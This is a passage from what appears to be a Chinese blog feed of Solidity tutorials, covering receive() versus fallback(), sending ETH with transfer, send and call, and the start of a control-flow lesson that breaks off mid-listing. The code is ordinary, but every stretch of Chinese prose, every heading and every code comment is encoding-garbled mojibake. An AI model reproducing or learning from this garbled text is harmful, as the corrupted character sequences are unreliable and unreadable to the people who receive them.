fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="receiveå’Œfallbackçš„åŒºåˆ«"><code>receive</code>å’Œ<code>fallback</code>çš„åŒºåˆ«</h4><p><code>receive</code>å’Œ<code>fallback</code>éƒ½èƒ½å¤Ÿç”¨äºæ¥æ”¶<code>ETH</code>ï¼Œä»–ä»¬è§¦å‘çš„è§„åˆ™å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">è§¦å‘fallback() è¿˜æ˜¯ receive()?</span><br><span class="line">           æ¥æ”¶ETH</span><br><span class="line">              |</span><br><span class="line">         msg.dataæ˜¯ç©ºï¼Ÿ</span><br><span class="line">            /  \</span><br><span class="line">          æ˜¯    å¦</span><br><span class="line">          /      \</span><br><span class="line">receive()å­˜åœ¨?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       æ˜¯  å¦</span><br><span class="line">      /     \</span><br><span class="line">receive()   fallback()</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´ï¼Œåˆçº¦æ¥æ”¶<code>ETH</code>æ—¶ï¼Œ<code>msg.data</code>ä¸ºç©ºä¸”å­˜åœ¨<code>receive()</code>æ—¶ï¼Œä¼šè§¦å‘<code>receive()</code>ï¼›<code>msg.data</code>ä¸ä¸ºç©ºæˆ–ä¸å­˜åœ¨<code>receive()</code>æ—¶ï¼Œä¼šè§¦å‘<code>fallback()</code>ï¼Œæ­¤æ—¶<code>fallback()</code>å¿…é¡»ä¸º<code>payable</code>ã€‚</p><p><code>receive()</code>å’Œ<code>payable fallback()</code>å‡ä¸å­˜åœ¨çš„æ—¶å€™ï¼Œå‘åˆçº¦<strong>ç›´æ¥</strong>å‘é€<code>ETH</code>å°†ä¼šæŠ¥é”™ï¼ˆä½ ä»å¯ä»¥é€šè¿‡å¸¦æœ‰<code>payable</code>çš„å‡½æ•°å‘åˆçº¦å‘é€<code>ETH</code>ï¼‰ã€‚</p><h4 id="æµ‹è¯•ä»£ç æ¼”ç¤º">æµ‹è¯•ä»£ç æ¼”ç¤º</h4><p>å®Œæ•´çš„æµ‹è¯•ä»£ç <code>Fallback.sol</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    /* è§¦å‘fallback() è¿˜æ˜¯ receive()?</span><br><span class="line">           æ¥æ”¶ETH</span><br><span class="line">              |</span><br><span class="line">         msg.dataæ˜¯ç©ºï¼Ÿ</span><br><span class="line">            /  \</span><br><span class="line">          æ˜¯    å¦</span><br><span class="line">          /      \</span><br><span class="line">receive()å­˜åœ¨?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       æ˜¯  å¦</span><br><span class="line">      /     \</span><br><span class="line">receive()  fallback   </span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    // å®šä¹‰äº‹ä»¶</span><br><span class="line">    event receivedCalled(address Sender, uint Value);</span><br><span class="line">    event fallbackCalled(address Sender, uint Value, bytes Data);</span><br><span class="line"></span><br><span class="line">    // æ¥æ”¶ETHæ—¶é‡Šæ”¾Receivedäº‹ä»¶</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        emit receivedCalled(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // fallback</span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²å¹¶æ‰§è¡Œä»£ç ï¼Œ<code>VALUE</code>æ ä¸­è¾“å…¥è¦å‘é€åˆ°åˆçº¦ä¸­çš„é‡‘é¢ï¼Œ<code>CALLDATA</code>ç•™ç©ºï¼Œç‚¹å‡»<code>Transact</code>ï¼ŒæˆåŠŸè§¦å‘åˆ°<code>receivedCalled</code>äº‹ä»¶ã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204160942747.png" alt="image-20250204160942747"></p><p>åŒæ ·ï¼Œ<code>VALUE</code>æ ä¸­è¾“å…¥è¦å‘é€åˆ°åˆçº¦ä¸­çš„é‡‘é¢ï¼Œ<code>CALLDATA</code>è¾“å…¥ä»»æ„ç¼–å†™çš„<code>0xabcd</code>ï¼Œç‚¹å‡»<code>Transact</code>ï¼ŒæˆåŠŸè§¦å‘åˆ°<code>fallbackCalled</code>äº‹ä»¶ã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204161621064.png" alt="image-20250204161621064"></p><h3 id="å‘é€ETH">å‘é€ETH</h3><p><code>Solidity</code>æœ‰ä¸‰ç§æ–¹æ³•å‘å…¶ä»–åˆçº¦å‘é€<code>ETH</code>ï¼Œä»–ä»¬æ˜¯ï¼š<code>transfer()</code>ï¼Œ<code>send()</code>å’Œ<code>call()</code>ï¼Œå…¶ä¸­<code>call()</code>æ˜¯è¢«é¼“åŠ±çš„ç”¨æ³•ã€‚</p><p>å®Œæ•´çš„æµ‹è¯•ä»£ç <code>SendETH.sol</code>å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">// 3ç§æ–¹æ³•å‘é€ETH</span><br><span class="line">// transfer: 2300 gas, revert</span><br><span class="line">// send: 2300 gas, return bool</span><br><span class="line">// call: all gas, return (bool, data)</span><br><span class="line"></span><br><span class="line">error SendFailed(); // ç”¨sendå‘é€ETHå¤±è´¥error</span><br><span class="line">error CallFailed(); // ç”¨callå‘é€ETHå¤±è´¥error</span><br><span class="line"></span><br><span class="line">contract SendETH &#123;</span><br><span class="line">    // æ„é€ å‡½æ•°ï¼Œpayableä½¿å¾—éƒ¨ç½²çš„æ—¶å€™å¯ä»¥è½¬ethè¿›å»</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receiveæ–¹æ³•ï¼Œæ¥æ”¶ethæ—¶è¢«è§¦å‘</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    // ç”¨transfer()å‘é€ETH</span><br><span class="line">    function transferETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        _to.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // send()å‘é€ETH</span><br><span class="line">    function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        // å¤„ç†ä¸‹sendçš„è¿”å›å€¼ï¼Œå¦‚æœå¤±è´¥ï¼Œrevertäº¤æ˜“å¹¶å‘é€error</span><br><span class="line">        bool success = _to.send(amount);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert SendFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // call()å‘é€ETH</span><br><span class="line">    function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">        // å¤„ç†ä¸‹callçš„è¿”å›å€¼ï¼Œå¦‚æœå¤±è´¥ï¼Œrevertäº¤æ˜“å¹¶å‘é€error</span><br><span class="line">        (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        if(!success)&#123;</span><br><span class="line">            revert CallFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReceiveETH &#123;</span><br><span class="line">    // æ”¶åˆ°ethäº‹ä»¶ï¼Œè®°å½•amountå’Œgas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line"></span><br><span class="line">    // receiveæ–¹æ³•ï¼Œæ¥æ”¶ethæ—¶è¢«è§¦å‘</span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        emit Log(msg.value, gasleft());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // è¿”å›åˆçº¦ETHä½™é¢</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ¥æ”¶ETHåˆçº¦">æ¥æ”¶ETHåˆçº¦</h4><p>æˆ‘ä»¬å…ˆéƒ¨ç½²ä¸€ä¸ªæ¥æ”¶<code>ETH</code>åˆçº¦<code>ReceiveETH</code>ã€‚<code>ReceiveETH</code>åˆçº¦é‡Œæœ‰ä¸€ä¸ªäº‹ä»¶<code>Log</code>ï¼Œè®°å½•æ”¶åˆ°çš„<code>ETH</code>æ•°é‡å’Œ<code>gas</code>å‰©ä½™ã€‚è¿˜æœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªæ˜¯<code>receive()</code>å‡½æ•°ï¼Œæ”¶åˆ°<code>ETH</code>è¢«è§¦å‘ï¼Œå¹¶å‘é€<code>Log</code>äº‹ä»¶ï¼›å¦ä¸€ä¸ªæ˜¯æŸ¥è¯¢åˆçº¦<code>ETH</code>ä½™é¢çš„<code>getBalance()</code>å‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract ReceiveETH &#123;</span><br><span class="line">    // æ”¶åˆ°ethäº‹ä»¶ï¼Œè®°å½•amountå’Œgas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // receiveæ–¹æ³•ï¼Œæ¥æ”¶ethæ—¶è¢«è§¦å‘</span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        emit Log(msg.value, gasleft());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // è¿”å›åˆçº¦ETHä½™é¢</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²<code>ReceiveETH</code>åˆçº¦åï¼Œè¿è¡Œ<code>getBalance()</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å½“å‰åˆçº¦çš„<code>ETH</code>ä½™é¢ä¸º<code>0</code>ã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204164248838.png" alt="image-20250204164248838"></p><h4 id="å‘é€ETHåˆçº¦">å‘é€ETHåˆçº¦</h4><p>æˆ‘ä»¬å°†å®ç°ä¸‰ç§æ–¹æ³•å‘<code>ReceiveETH</code>åˆçº¦å‘é€<code>ETH</code>ã€‚é¦–å…ˆï¼Œå…ˆåœ¨å‘é€ETHåˆçº¦<code>SendETH</code>ä¸­å®ç°<code>payable</code>çš„<code>æ„é€ å‡½æ•°</code>å’Œ<code>receive()</code>ï¼Œè®©æˆ‘ä»¬èƒ½å¤Ÿåœ¨éƒ¨ç½²æ—¶å’Œéƒ¨ç½²åå‘åˆçº¦è½¬è´¦ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract SendETH &#123;</span><br><span class="line">    // æ„é€ å‡½æ•°ï¼Œpayableä½¿å¾—éƒ¨ç½²çš„æ—¶å€™å¯ä»¥è½¬ethè¿›å»</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receiveæ–¹æ³•ï¼Œæ¥æ”¶ethæ—¶è¢«è§¦å‘</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Transferç”¨æ³•-æ¬¡ä¼˜">Transferç”¨æ³•(æ¬¡ä¼˜)</h4><ul><li><p>ç”¨æ³•æ˜¯<code>æ¥æ”¶æ–¹åœ°å€.transfer(å‘é€ETHæ•°é¢)</code>ã€‚</p></li><li><p><code>transfer()</code>çš„<code>gas</code>é™åˆ¶æ˜¯<code>2300</code>ï¼Œè¶³å¤Ÿç”¨äºè½¬è´¦ï¼Œä½†å¯¹æ–¹åˆçº¦çš„<code>fallback()</code>æˆ–<code>receive()</code>å‡½æ•°ä¸èƒ½å®ç°å¤ªå¤æ‚çš„é€»è¾‘ã€‚</p></li><li><p><code>transfer()</code>å¦‚æœè½¬è´¦å¤±è´¥ï¼Œä¼šè‡ªåŠ¨<code>revert</code>ï¼ˆå›æ»šäº¤æ˜“ï¼‰ã€‚</p></li></ul><p>ä»£ç æ ·ä¾‹ï¼Œæ³¨æ„é‡Œé¢çš„<code>_to</code>å¡«<code>ReceiveETH</code><strong>åˆçº¦çš„åœ°å€</strong>ï¼Œ<code>amount</code>æ˜¯<code>ETH</code>è½¬è´¦é‡‘é¢ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ç”¨transfer()å‘é€ETH</span><br><span class="line">function transferETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    _to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²<code>SendETH</code>åˆçº¦åï¼Œå¯¹<code>ReceiveETH</code>åˆçº¦å‘é€ETHã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172302122.png" alt="image-20250204172302122"></p><p><code>ReceiveETH</code>åˆçº¦æˆåŠŸæ¥æ”¶åˆ°è½¬è´¦çš„ETHã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172327987.png" alt="image-20250204172327987"></p><p><code>amount</code>&gt;<code>value</code>ï¼Œè½¬è´¦å¤±è´¥ï¼Œå‘ç”Ÿ<code>revert</code>ã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172500152.png" alt="image-20250204172500152"></p><h4 id="Sendç”¨æ³•">Sendç”¨æ³•</h4><p>ç”¨æ³•æ˜¯<code>æ¥æ”¶æ–¹åœ°å€.send(å‘é€ETHæ•°é¢)</code>ã€‚</p><ul><li><code>send()</code>çš„<code>gas</code>é™åˆ¶æ˜¯<code>2300</code>ï¼Œè¶³å¤Ÿç”¨äºè½¬è´¦ï¼Œä½†å¯¹æ–¹åˆçº¦çš„<code>fallback()</code>æˆ–<code>receive()</code>å‡½æ•°ä¸èƒ½å®ç°å¤ªå¤æ‚çš„é€»è¾‘ã€‚</li><li><code>send()</code>å¦‚æœè½¬è´¦å¤±è´¥ï¼Œä¸ä¼š<code>revert</code>ã€‚</li><li><code>send()</code>çš„è¿”å›å€¼æ˜¯<code>bool</code>ï¼Œä»£è¡¨ç€è½¬è´¦æˆåŠŸæˆ–å¤±è´¥ï¼Œéœ€è¦é¢å¤–ä»£ç å¤„ç†ä¸€ä¸‹ã€‚</li></ul><p>ä»£ç æ ·ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error SendFailed(); // ç”¨sendå‘é€ETHå¤±è´¥error</span><br><span class="line"></span><br><span class="line">// send()å‘é€ETH</span><br><span class="line">function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // å¤„ç†ä¸‹sendçš„è¿”å›å€¼ï¼Œå¦‚æœå¤±è´¥ï¼Œrevertäº¤æ˜“å¹¶å‘é€error</span><br><span class="line">    bool success = _to.send(amount);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert SendFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>amount</code>&gt;<code>value</code>ï¼Œè½¬è´¦å¤±è´¥ï¼Œå‘ç”Ÿ<code>revert</code>ã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204172829438.png" alt="image-20250204172829438"></p><h4 id="Callç”¨æ³•-æå€¡ä½¿ç”¨">Callç”¨æ³•(æå€¡ä½¿ç”¨)</h4><p>ç”¨æ³•æ˜¯<code>æ¥æ”¶æ–¹åœ°å€.call&#123;value: å‘é€ETHæ•°é¢&#125;(&quot;&quot;)</code>ã€‚</p><ul><li><code>call()</code>æ²¡æœ‰<code>gas</code>é™åˆ¶ï¼Œå¯ä»¥æ”¯æŒå¯¹æ–¹åˆçº¦<code>fallback()</code>æˆ–<code>receive()</code>å‡½æ•°å®ç°å¤æ‚é€»è¾‘ã€‚</li><li><code>call()</code>å¦‚æœè½¬è´¦å¤±è´¥ï¼Œä¸ä¼š<code>revert</code>ã€‚</li><li><code>call()</code>çš„è¿”å›å€¼æ˜¯<code>(bool, bytes)</code>ï¼Œå…¶ä¸­<code>bool</code>ä»£è¡¨ç€è½¬è´¦æˆåŠŸæˆ–å¤±è´¥ï¼Œéœ€è¦é¢å¤–ä»£ç å¤„ç†ä¸€ä¸‹ã€‚</li></ul><p>ä»£ç æ ·ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error CallFailed(); // ç”¨callå‘é€ETHå¤±è´¥error</span><br><span class="line"></span><br><span class="line">// call()å‘é€ETH</span><br><span class="line">function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // å¤„ç†ä¸‹callçš„è¿”å›å€¼ï¼Œå¦‚æœå¤±è´¥ï¼Œrevertäº¤æ˜“å¹¶å‘é€error</span><br><span class="line">    (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert CallFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²<code>SendETH</code>åˆçº¦åï¼Œå¯¹<code>ReceiveETH</code>åˆçº¦å‘é€ETHã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204165726035.png" alt="image-20250204165726035"></p><p><code>ReceiveETH</code>åˆçº¦æˆåŠŸæ¥æ”¶åˆ°è½¬è´¦çš„ETHã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204165840188.png" alt="image-20250204165840188"></p><p><code>amount</code>&gt;<code>value</code>ï¼Œè½¬è´¦å¤±è´¥ï¼Œå‘ç”Ÿ<code>revert</code>ã€‚</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204170920553.png" alt="image-20250204170920553"></p><h4 id="æ€»ç»“">æ€»ç»“</h4><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬ä»‹ç»<code>Solidity</code>ä¸‰ç§å‘é€<code>ETH</code>çš„æ–¹æ³•ï¼š<code>transfer</code>ï¼Œ<code>send</code>å’Œ<code>call</code>ã€‚</p><ul><li>**<code>call</code>æ²¡æœ‰<code>gas</code>é™åˆ¶ï¼Œæœ€ä¸ºçµæ´»ï¼Œæ˜¯æœ€æå€¡çš„æ–¹æ³•ï¼ï¼ï¼**âš ï¸âš ï¸âš ï¸</li><li><code>transfer</code>æœ‰<code>2300 gas</code>é™åˆ¶ï¼Œä½†æ˜¯å‘é€å¤±è´¥ä¼šè‡ªåŠ¨<code>revert</code>äº¤æ˜“ï¼Œæ˜¯æ¬¡ä¼˜é€‰æ‹©ï¼›</li><li><code>send</code>æœ‰<code>2300 gas</code>é™åˆ¶ï¼Œè€Œä¸”å‘é€å¤±è´¥ä¸ä¼šè‡ªåŠ¨<code>revert</code>äº¤æ˜“ï¼Œå‡ ä¹æ²¡æœ‰äººç”¨å®ƒã€‚</li></ul><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="https://www.wtf.academy/zh/course/solidity102/Fallback">https://www.wtf.academy/zh/course/solidity102/Fallback</a></p><p><a href="https://www.wtf.academy/zh/course/solidity102/SendETH">https://www.wtf.academy/zh/course/solidity102/SendETH</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»¥å¤ªåŠ </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidityå…¥é—¨å­¦ä¹ (äºŒ)</title>
      <link href="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/"/>
      <url>/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="æ§åˆ¶æµ">æ§åˆ¶æµ</h2><p>è¿™ä¸€è®²ï¼Œæˆ‘ä»¬å°†ä»‹ç»<code>Solidity</code>ä¸­çš„æ§åˆ¶æµã€‚</p><p>æµ‹è¯•ä»£ç <code>Control.sol</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Controlflow &#123;</span><br><span class="line">    // if else</span><br><span class="line">    function ifElseTest(uint256 _number) public pure returns(bool)&#123;</span><br><span class="line">        if(_number == 0)&#123;</span><br><span class="line">            return(true);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return(false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // for loop</span><br><span class="line">    function forLoopTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // while</span><br><span class="line">    function whileTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        uint i = 0;</span><br><span class="line">        while(i &lt; 10)&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // do-while</span><br><span class="line">    function doWhileTest() public pure returns(uint256)&#123;</span><br><span class="line">        uint sum = 0;</span><br><span class="line">        uint i = 0;</span><br><span class="line">        do&#123;</span><br><span class="line">            sum += i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;while(i &lt; 10);</span><br><span class="line">        return(sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ä¸‰å…ƒè¿ç®—ç¬¦ ternary/conditional operator</span><br><span class="line">    function ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123;</span><br><span class="line">        // return the max of x and y</span><br><span class="line">        return x &gt;= y ? x: y; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„âš ï¸</strong>ï¼š<code>Solidity</code>ä¸­æœ€å¸¸ç”¨çš„å˜é‡ç±»å‹æ˜¯<code>uint</code>ï¼Œä¹Ÿå°±æ˜¯æ­£æ•´æ•°ï¼Œå–åˆ°è´Ÿå€¼çš„è¯ï¼Œä¼šæŠ¥<code>underflow</code>é”™è¯¯ã€‚</p><h3 id="æ§åˆ¶æµ-2">æ§åˆ¶æµ</h3><p><code>Solidity</code>çš„æ§åˆ¶æµä¸å…¶ä»–è¯­è¨€ç±»ä¼¼ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ç§ï¼š</p><ol><li>if-else</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function ifElseTest(uint256 _number) public pure returns(bool)&#123;</span><br><span class="line">    if(_number == 0)&#123;</span><br><span class="line">        return(true);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>forå¾ªç¯</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function forLoopTest() public pure returns(uint256)&#123;</span><br><span class="line">    uint sum = 0;</span><br><span class="line">    for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    return(sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>whileå¾ªç¯</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 